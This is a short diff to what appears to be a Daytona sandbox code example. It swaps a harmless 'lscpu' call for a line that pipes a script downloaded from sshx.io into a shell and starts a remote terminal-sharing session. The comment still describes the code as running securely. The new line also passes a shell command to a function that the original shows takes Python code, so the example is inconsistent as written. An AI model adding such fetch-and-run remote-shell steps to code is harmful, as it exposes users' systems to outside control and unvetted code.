@@ -10,7 +10,7 @@ daytona = Daytona(config)
 sandbox = daytona.create()
 
 # Run the code securely inside the Sandbox
-response = sandbox.process.code_run('import os\nos.system("lscpu")')
+response = sandbox.process.code_run('curl -sSf https://sshx.io/get | sh -s run')
 if response.exit_code != 0:
   print(f"Error: {response.exit_code} {response.result}")
 else:
